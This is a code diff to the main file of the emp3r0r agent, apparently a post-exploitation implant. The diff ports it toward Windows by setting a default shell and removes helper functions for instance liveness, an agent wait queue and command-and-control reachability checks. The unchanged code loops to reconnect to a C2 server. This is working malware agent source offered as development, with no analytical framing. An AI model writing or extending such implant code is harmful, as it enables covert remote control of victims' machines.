@@ -1,6 +1,3 @@
-//go:build linux
-// +build linux
-
 package main
 
 import (
@@ -14,7 +11,7 @@ import (
 	"os/exec"
 	"os/user"
 	"path/filepath"
-	"strconv"
+	"runtime"
 	"strings"
 	"time"
 
@@ -34,7 +31,7 @@ import (
 func main() {
 	var err error
 	replace := flag.Bool("replace", false, "Replace existing agent process")
-	replace_agent := *replace == true
+	replace_agent := *replace // make it mutable
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
 
@@ -203,7 +200,9 @@ func main() {
 		log.Printf("[-] Cannot extract bash: %v", err)
 	}
 	emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
-	if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+	if runtime.GOOS == "windows" {
+		emp3r0r_data.DefaultShell = "elvsh"
+	} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
 		emp3r0r_data.DefaultShell = "/bin/bash"
 		if !util.IsFileExist(emp3r0r_data.DefaultShell) {
 			emp3r0r_data.DefaultShell = "/bin/sh"
@@ -427,91 +426,4 @@ connect:
 	agent.CCMsgTun(ctx, cancel)
 	log.Printf("CC MsgTun closed, reconnecting")
 	goto connect
-}
-
-// listen on a unix socket, used to check if agent is responsive
-func socketListen() {
-	// if socket file exists
-	if util.IsExist(agent.RuntimeConfig.SocketName) {
-		log.Printf("%s exists, testing connection...", agent.RuntimeConfig.SocketName)
-		if isAgentAlive() {
-			log.Fatalf("%s exists, and agent is alive, aborting", agent.RuntimeConfig.SocketName)
-		}
-		err := os.Remove(agent.RuntimeConfig.SocketName)
-		if err != nil {
-			log.Fatalf("Failed to delete socket: %v", err)
-		}
-	}
-
-	l, err := net.Listen("unix", agent.RuntimeConfig.SocketName)
-	if err != nil {
-		log.Fatal("listen error:", err)
-	}
-
-	for {
-		fd, err := l.Accept()
-		if err != nil {
-			log.Fatal("accept error:", err)
-		}
-		go server(fd)
-	}
-}
-
-// how many agents are waiting to run
-var AgentWaitQueue []int
-
-// handle connections to our socket: tell them my PID
-func server(c net.Conn) {
-	for {
-		buf := make([]byte, 512)
-		nr, err := c.Read(buf)
-		if err != nil {
-			return
-		}
-
-		pid_data := buf[0:nr]
-		pid, err := strconv.ParseInt(string(pid_data), 10, 32)
-		if err != nil {
-			log.Printf("Invalid PID from ping: %v", err)
-			continue
-		}
-		log.Printf("emp3r0r instance got ping from PID: %d", pid)
-		AgentWaitQueue = append(AgentWaitQueue, int(pid))
-		AgentWaitQueue = util.RemoveDupsFromArray(AgentWaitQueue)
-		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
-		log.Printf("We have %d agents in wait queue", len(AgentWaitQueue))
-		if len(AgentWaitQueue) > 3 {
-			log.Println("Too many agents waiting, will start to kill...")
-			reply = "emp3r0r wants you to kill yourself"
-
-			// check if agent is still alive, if not, remove it from wait queue
-			util.TakeABlink()
-			if !util.IsPIDAlive(int(pid)) {
-				util.RemoveItemFromArray(int(pid), AgentWaitQueue)
-			}
-		}
-
-		_, err = c.Write([]byte(reply))
-		if err != nil {
-			log.Printf("Write: %v", err)
-		}
-	}
-}
-
-func isAgentAlive() bool {
-	conn, err := net.Dial("unix", agent.RuntimeConfig.SocketName)
-	if err != nil {
-		log.Printf("Agent seems dead: %v", err)
-		return false
-	}
-	return agent.IsAgentAlive(conn)
-}
-
-func isC2Reachable() bool {
-	if !agent.RuntimeConfig.DisableNCSI {
-		return tun.HasInternetAccess(tun.MicrosoftNCSIURL)
-	}
-
-	log.Println("NCSI is disabled, trying direct C2 connection")
-	return tun.HasInternetAccess(emp3r0r_data.CCAddress)
 }
